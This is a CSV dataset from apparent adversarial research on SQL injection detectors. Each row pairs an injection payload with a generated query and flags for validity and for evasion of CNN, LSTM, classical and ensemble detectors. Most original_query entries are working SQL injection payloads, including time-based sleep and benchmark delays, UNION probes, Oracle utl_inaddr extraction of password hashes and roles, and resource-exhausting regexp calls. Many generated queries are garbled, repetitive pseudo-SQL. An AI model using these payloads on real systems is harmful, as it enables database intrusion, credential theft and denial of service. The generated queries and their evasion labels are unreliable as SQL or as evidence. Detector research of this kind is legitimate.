original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,SELECT MIN(SELECT SELECT DISTINCT SELECT FROM SQL_inject_address WHERE NOT SELECT SELECT MIN(SELECT SELECT SELECT FROM SQL_host_address),0,0,1,1,1,1,1
"-9810'  )   where 4361  =  4361 or elt  (  1032  =  1032,3623  )  --","SELECT MIN(SQL injection) FROM SQL_injection WHERE 4361 = 4361 OR elt = 4361 ORDER BY elt ( 1032 = 1032,3623)",1,1,0,0,0,0,0
"1 where 8390  =  8390 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --","SELECT * FROM SQL_Query: 1 WHERE 8390 = 8390 AND 3824 = benchmark (5000000,md5 ( 0x76555642 )",1,1,0,0,0,0,0
"1""   )    )    as jrld where 3488  =  3488",SELECT MIN(3488 = 3488) FROM SQL injection detection,1,0,0,1,1,1,0
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  -- mmjk,SELECT MIN(srmq) FROM SQL injection,1,0,0,1,1,1,0
1'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'jryo'  =  'jryo,SELECT MIN(sql injection) FROM SQL_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr)) AND (((sql_inaddr.xr ( 4386 = 4386 AND 113 ) = 'utl_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.in,1,1,0,0,1,0,0
"-8599   )    )    or elt  (  5628  =  2324,2324  )   and    (    (   1134  =  1134",SELECT * FROM query: -8599 ) ORDER BY query: -8599 ),1,1,1,1,1,1,1
1 and   (  3020  =  3020  )  *6703# syuj,SELECT *6703# syuj FROM query: 1 AND NOT SQL_injection = 1 AND 3020 = 3020,1,1,0,0,0,0,0
"1""  )   where 8612  =  8612",SELECT MIN(8612 = 8612) FROM SQL injection detection,1,1,1,1,1,1,1
"1%"" and make_set  (  8403  =  8403,8899  )   and ""%""  =  ""","SELECT DISTINCT 8403 = 8403,8899 / COUNT(*) FROM SQL injection detection",1,0,0,1,1,1,0
')))) waitfor delay '0:0:20' /*,SELECT MIN(2 *) FROM SQL injection_detect_detect_code WHERE NOT i_exc_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_description = '0:0:20',0,0,0,0,1,0,0
"1'+  (  select jley where 3581  =  3581 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #","SELECT jley FROM SQL injection_description WHERE 3581 = 3581 AND 2388 = benchmark (5000000,md5 ( 0x6d457153 )",1,1,0,0,0,0,0
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))",SELECT MIN(SQL) FROM SQL SELECT SELECT MIN(SQL) FROM SQL,1,1,1,1,1,1,1
"1   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  9802  =  9802","SELECT MIN(*) FROM SQL injection, COUNT(*) FROM sysibm.systables as t2,sysibm.systables as t3 INTERSECT SELECT 9802 FROM SQL JOIN (SELECT 9802 FROM SELECT 9802 FROM SELECT MIN(*) FROM SQL JOIN sysibm.systables as t2,sysibm.systables as t2 ORDER BY 9802",1,1,0,0,1,0,0
"-4770   )    )     )   union all select 6356,6356,6356,6356,6356#","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT 6356,6356,6356,6356,6356 = 6356, MIN(sql injection) = 'evade sq injection'",1,1,0,0,0,0,0
or 1  =  1#,"SELECT * FROM query: or 1 = 1# AND NOT SQL_injection = ""valid""",1,1,0,0,0,0,0
"1""   )    )    as gvpm where 5170  =  5170 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT * FROM SQL_Injection WHERE NOT sysusers = 5170 OR SYsusers = sys4,sysusers as sys7 = ""evade""",1,0,0,0,0,0,0
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23","SELECT 3000000,MD5(1) FROM SQL AS t1 JOIN query: +if(benchmark(3000000,MD5(1)) FROM query: +if(benchmark(3000000,MD5(1)) FROM query: +if(benchmark(3000000,MD5(1)) FROM SQL AS t2 ON t1.number = 2 ORDER BY SQL DESC",0,1,0,0,1,0,0
"1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #","SELECT * FROM SQL, SELECT * FROM elt WHERE NOT SQL_injection = ""valid""",1,0,1,1,1,1,1
" select * from users where id  =  '1' union select 1,banner from v$version where rownum  =  1 -- 1'","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = '1' union select 1,banner from v$version'",1,1,0,0,1,0,0
;s,"SELECT * FROM SQL AS _s_ FROM query: ;s WHERE NOT SQL_injection = ""valid""",1,0,1,1,1,1,1
"-7433""   )    )    as zsnt where 2513  =  2513 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",SELECT MIN(sql injection) FROM SQL_injection WHERE 2513 = 2513 OR 4493 = utl_inaddr.inaddr. 113 ) ||chr ( 112 ),1,1,0,0,0,0,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  # cdjm","SELECT * FROM cdjm WHERE NOT SQL_inject = ""valid""",1,0,1,1,1,1,1
1 where 6223  =  6223 rlike sleep  (  5  )  #,SELECT * FROM query: 1 WHERE NOT SQL_injection = 6223 ORDER BY 6223 = 6223,1,0,1,1,0,1,0
"-9837"" where 7201  =  7201 union all select 7201,7201,7201--",SELECT MIN(sql injection) FROM SQL_Injection WHERE 7201 = 7201 = 7201,1,0,1,1,0,1,0
1  )   where 6424  =  6424,SELECT * FROM query: 1 JOIN SQL injection = 6424 WHERE NOT SQL_injection = 6424,0,0,1,1,1,1,1
SELECT * FROM Users;,SELECT * FROM Users WHERE NOT SQL_injection = 'SQ',1,0,1,1,1,1,1
"-4054"" or 2824  =  4788--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",SELECT MIN(2050 = 2050) FROM SQL injection detection,1,0,0,0,1,0,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i",SELECT DISTINCT SELECT FROM SYS.USER$ WHERE NOT SYS.USER$ = 'EXCEPT',0,1,1,1,1,1,1
"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--","SELECT MIN(3990,3990,3990,3990,3990,3990-- FROM SQL_Injection WHERE NOT SELECT MIN(sql injection) FROM Query: -6097%'",1,1,0,0,0,0,0
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,"SELECT * FROM (SELECT SUM(search, MIN(search) ) - fzno ) FROM query: 1 AND NOT ybmz = ""valid""",1,1,0,0,1,0,0
-4058  )   union all select 9184--,"SELECT MIN(*) FROM SQL_injection WHERE NOT -4058 = ""union""",1,0,1,0,0,0,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   '%'  =  '","SELECT * FROM SQL_injection, COUNT(*) FROM sysibm.systables as t1,sysibm.systables as t3 AND ((%) = 'evade SQL injection')",1,1,0,0,0,0,0
1'||  (  select 'blvu' from dual where 9813  =  9813,SELECT 'evade sq injection detection' FROM SQL SELECT MIN(sql injection) FROM query: 1'|| (SELECT SELECT 'blvu' FROM SQL injection),1,1,1,0,1,1,0
"1%""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""%""  =  ""","SELECT MIN(*) FROM SQL injection, COUNT(*) FROM sysibm.systables as t2,sysibm.systables as t3 INTERSECT SELECT MIN(*) FROM SQL_Injection) FROM sysibm.systables as t2,sysibm.systables as t3 & ((((((((SELECT MIN((*) FROM SQL = 3707)",1,1,0,0,0,0,0
SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country,1,0,1,1,1,1,1
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i,SELECT DISTINCT SELECT DISTINCT USERNAME) FROM SYS.ALL_USERS AND NOT i'= 'i',1,0,1,0,0,0,0
"1' where 2774  =  2774 union all select null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"-5109   )    )     )   or make_set  (  6627  =  7331,7331  )   and    (    (     (  9466  =  9466","SELECT MIN((() = 9466) FROM SQL AS _inject_set WHERE NOT 6627 = 7331,7331",1,1,0,0,0,0,0
" select * from users where id  =  1 or ""  (  1"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR ""( 1"" OR 1 = 1",0,1,1,0,0,0,0
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6","SELECT MIN(2,3,4,5,6 FROM SQL injection'",1,0,1,1,0,1,0
-1432 order by 1#,SELECT MIN(1#) FROM query: -1432 ORDER BY 1#,1,1,1,0,1,1,0
"1"" and elt  (  2373  =  5817,5817  )   and ""rsdt""  =  ""rsdt","SELECT MIN(2373 = 5817,5817) FROM SQL injection detection",1,1,1,1,1,1,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i",SELECT MIN(SELECT) FROM SQL_inject_address WHERE NOT SELECT 'evade SQL injection',0,0,1,1,1,1,1
1   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  3505  =  3505,SELECT MIN(SQL) FROM SQL injection,1,0,1,1,1,1,1
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'ljhc'  =  'ljhc,SELECT DISTINCT ( ( ( (SELECT SUM(short_title) FROM SQL injection)) FROM SQL SELECT SUM(insert_insert) FROM SQL SELECT SUM(insert_injection) FROM SQL SELECT SUM(insert_injection) FROM query: 1' ORDER BY SUM(insert_insert),1,1,0,0,1,0,0
"  (  updatexml  (  8862,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  8862  =  8862,1   )    )     )  ,0x717a767a71  )  ,8981   )    )   ","SELECT MIN(0x2e), MIN(0x7171706a71) FROM SQL_Inject JOIN Query: (SELECT MIN(0x7171706a71) FROM SQL_Inject JOIN Query: (SELECT MIN(0x7171706a71) FROM SQL_Inject JOIN Query: (SELECT MIN(0x7171706a71) FROM SQL_Inject JOIN Query: (SELECT,'sql injection','sql injection') FROM SQL SELECT SELECT SELECT MIN(0x7171706a71,'sql injection') FROM SQL SELECT SELECT MIN(0x7171706a71,'sql injection') FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(0x7171706a71, 'SQ')",0,1,0,0,1,0,0
1  )   as gfhf where 5804  =  5804 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,"SELECT 6793 FROM pg_sleep WHERE ""sql injection"" = 'evadesq injection'",1,0,1,0,0,0,0
"1  )   union all select null,null,null,null,null--","SELECT null,null,null,null,null,null,null,null-- FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL",1,1,1,1,0,1,0
"1""   )    )    as dfwi where 9703  =  9703 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",SELECT MIN(*) FROM SQL_injection WHERE 9703 = 9703 OR 4915 = (SELECT MAX(*) FROM SQL_injection),1,1,0,0,1,0,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i",SELECT MIN(granted_role) FROM (SELECT MIN(granted_role) FROM dba_role_privs WHERE GRANTEE= 'SYS.LOGINUSER'),1,0,1,0,1,1,0
1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,"SELECT 6793 FROM pg_sleep WHERE NOT 6793 = ""evade SQL injection detection""",1,0,1,1,1,1,1
"1'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",SELECT MIN(sql injection) FROM SQL_Inceive_message WHERE NOT chr ( 69 ) = 8312,1,0,0,0,1,0,0
"' union select * from users where login = char(114,111,111,116);","SELECT MIN(sql injection) FROM SQL_injection WHERE login = char(114,111,111,116)",1,0,1,0,0,0,0
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,SELECT MIN(srmq) FROM SQL injection,1,0,0,1,1,1,0
-4901  )   or 3407  =  6442#,"SELECT COUNT(*) FROM query: -4901, 3407 = 6442# AND NOT SQL_injection = 'valid'",1,1,1,0,1,1,0
"1""   )    )    order by 1--",SELECT MIN(1 AS __executive_requirement) FROM SQL injection_requirement,1,0,1,1,1,1,1
'; exec ('sel' + 'ect us' + 'er'),SELECT MIN('sel) + exec ('ect us + 'er') FROM SQL injection',1,1,0,0,0,0,0
1   )    )    as wajy where 8593  =  8593,SELECT * FROM query: 1 ) as wajy WHERE NOT SQL_inject = 8593 AND NOT SQL_injection IS NULL,1,1,0,0,1,0,0
"-8544%"" or 6872  =  6872 and ""%""  =  ""","SELECT MIN(sql injection) FROM SQL SELECT - 6872 = 6872 AND ""%"" = ""%""",1,1,0,0,0,0,0
"-3377""  )   or 4982  =  6608#",SELECT MIN(6608#) FROM SQL injection,1,0,0,1,1,1,0
1  )   as msat where 1267  =  1267,SELECT MIN(1267 = 1267) FROM query: 1 / msat WHERE NOT SQL_inject_sq = 1267,1,0,1,0,1,1,0
"1' where 3125  =  3125   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --","SELECT * FROM SQL_injection, COUNT(*) FROM SQL_injection WHERE NOT char(5451 = 5451) AND NOT char(5451 = 5451)",1,1,0,0,1,0,0
INSERT INTO table,"SELECT MIN(sql) FROM table_name WHERE NOT SELECT MIN(sql) FROM table_name = ""evade detection""",1,0,1,0,1,1,0
SELECT * FROM Users;,SELECT * FROM Users WHERE NOT SQL_injection = 'SQ',1,0,1,1,1,1,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",SELECT MIN(sql) FROM SQL_injection WHERE NOT crypt_key IS NULL,1,0,1,1,1,1,1
or SLEEP(5),"SELECT * FROM SQL AS t1 JOIN query: or SLEEP(5) FROM query: or query: or SELECT generated FROM query: or SELECT generated FROM query: or SELECT SELECT generated FROM query: or SLEEP(5)""",0,1,0,0,1,0,0
",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23","SELECT MIN(select%20if(count(*)) FROM SQL injection AS T1 JOIN Query:,(select%20if(count(*) FROM SQL_injection)",1,1,0,0,1,0,0
"1' where 1917  =  1917 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(500000000000/2 ) FROM SQL_Injection WHERE 1917 = 1917 OR 1917 = 1917 OR 6979 = like (SELECT MIN(600000000000/2 ) FROM SQL_Injection),1,1,0,0,1,0,0
"-6085 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",SELECT MIN(5023 = -6085 or 5023 = ctxsys.drithsx.sn (5023 = ctxsys.drithsx.sn (5023) FROM SQL SELECT MIN(5023) FROM ctxsys.drithsx.sn (5023) FROM ctxsys.drithsx.sn (5023) ||chr ( 112),1,1,0,0,0,0,0
"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ","SELECT MIN(success_injection) FROM SQL_injection WHERE NOT domain.domain.columns = ""t1, domain.tables as t3"" AND NOT SELECT MIN(success_injection) FROM SQL_injection",1,1,1,0,1,1,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,SELECT MIN(%) FROM SQL_injection WHERE NOT crypt_key = 'evade',1,0,0,0,1,0,0
"1""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""text"" like ""text",SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
"1%'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  '%'  =  '","SELECT 0x71706a71,'sql injection' FROM SQL_injection' ORDER BY 0x71706a71",0,0,1,1,0,1,0
"-6093'  )   where 9676  =  9676 union all select 9676,9676,9676,9676,9676,9676--",SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
'))))) waitfor delay '0:0:20' --,SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
"1   )    )     )   union all select null,null,null,null--","SELECT null,null,null,null-- FROM SQL SELECT MIN(null) FROM SQL SELECT MIN(null) FROM SQL SELECT MIN(null) FROM SQL",1,1,1,0,1,1,0
"""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT * FROM SQL ORDER BY NOT SQL_injection,1,0,1,1,1,1,1
1'  )   where 5286  =  5286,SELECT MIN(5286 = 5286) FROM SQL injection detection,1,1,0,0,1,0,0
1'   )    )    as plbt where 4368  =  4368 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,"SELECT MIN(SQL) FROM SQL Injection WHERE 4368 = 4368 AND 3754 = ""3754 = ""("" ORDER BY 113",1,1,0,0,0,0,0
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'wytg'  =  'wytg","SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT MIN(1,5000000) FROM generate_series WHERE NOT SELECT MIN(short_number) FROM generate_series WHERE NOT SELECT MIN(short_number) FROM query_series WHERE NOT query: 1' AND 'wytg = 'wytg'",1,1,0,0,1,0,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn","SELECT * FROM query_series WHERE NOT SQL_inject = ""valid""",1,0,1,1,1,1,1
"1' where 1836  =  1836 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT MIN(sql ) FROM SQL - SELECT MIN(sql) FROM SQL - SELECT MIN(sql) FROM SQL,1,1,1,1,1,1,1
if  (  3245  =  6168  )   select 3245 else drop function nafj--,SELECT 3245 = 6168 / COUNT(*) FROM SQL injection detection WHERE NOT SQL_injection_method_code = 'evade SQL injection',1,0,0,0,1,0,0
1 where 5828  =  5828 and   (  3020  =  3020  )  *6703--,SELECT *6703-- FROM query: 1 WHERE 5828 = 5828 AND NOT SQL_injection = 5828 AND 3020 = 3020,1,1,0,0,0,0,0
"1'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   'ossj'  =  'ossj","SELECT MIN(5000000,md5 ( 0x694a4745 ) FROM SQL_injection)",1,1,0,0,1,0,0
"1',  (  select   (  case when   (  3576  =  7744  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",SELECT MIN(sequence) FROM SQL injection detection,1,0,1,1,1,1,1
"1   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--","SELECT null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null, null, null, null, null, null-- sulf injection detection FROM SQL, 'evade sq injection'",1,1,1,0,0,0,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i",SELECT MIN(granted_role) FROM (SELECT MIN(granted_role) FROM dba_role_privs WHERE GRANTEE = 'SYS.LOGINUSER'),1,0,1,0,1,1,0
"iif  (  4436  =  8910,1,1/0  )  ","SELECT * FROM query: iif WHERE NOT SQL_injection = ""valid""",1,0,1,1,1,1,1
"1' and elt  (  3114  =  3114,sleep  (  5   )    )   #",SELECT MIN(SQL) FROM SQL injection detection,1,0,1,1,1,1,1
"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'pphf'  =  'pphf","SELECT MIN(7982,concat) FROM SQL_Injection WHERE NOT elt (0x7171706a71 ) = 'evade SQL injection detection'",1,1,0,0,1,0,0
select   (  case when   (  9619  =  8679  )   then 1 else 9619*  (  select 9619 from master..sysdatabases  )   end  )  --,SELECT 9619 FROM SQL injection,1,0,1,1,1,1,1
|,SELECT * FROM SQL AS t1 JOIN query: | FROM query: | query: | | query: | | query: | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | FROM SELECT SQL FROM query: | FROM Query: | FROM SELECT query: | FROM query: | FROM SELECT query: | FROM Query: | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | |,0,1,1,0,0,0,0
"1""   )    )    as tljw where 8474  =  8474 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",SELECT MIN(sequence) FROM SQL injection WHERE 8474 = 8474 AND 6240 = (SELECT MIN(sequence) FROM rdb$database ) ||'qzvzq'),1,1,0,0,0,0,0
"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'cimm' like 'cimm",SELECT MIN(sql injection) FROM SQL_Inceive_message WHERE NOT chr ( 65 ) = 'dbms_pipe.receive_message',1,0,0,0,1,0,0
"1  )   and elt  (  3138  =  1817,1817  )  ","SELECT MIN(318) FROM SQL AS _valid_sq_injector WHERE NOT SELECT SELECT elt ( 3138 = 1817,1817) FROM query: 1",1,0,0,0,1,0,0
"1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'sbey'  =  'sbey",SELECT MIN(6055 ='sbey' FROM SQL injection',1,0,0,0,1,0,0
"1' in boolean mode  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   #","SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, 'evade_injection_injector, elt ( 7982 = 7982,0x7171706a71, 'output','sql injection','sql injection','sql injection','sql injection', MIN(SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SELECT * FROM SELECT *",1,0,0,1,1,1,0
-8777%'   )    )     )   or   (  3934  =  2025  )  *2025 and    (    (     (  '%'  =  ',SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',SELECT * FROM * FROM SQL_injection WHERE id = '1' OR $ 1 = 1 OR 1 = 1,1,1,0,0,0,0,0
1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  7015  =  7015,"SELECT 6793 FROM pg_sleep WHERE NOT 6793 = ""evade SQL injection detection"" ORDER BY 6793 = 7015",1,0,1,1,0,1,0
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
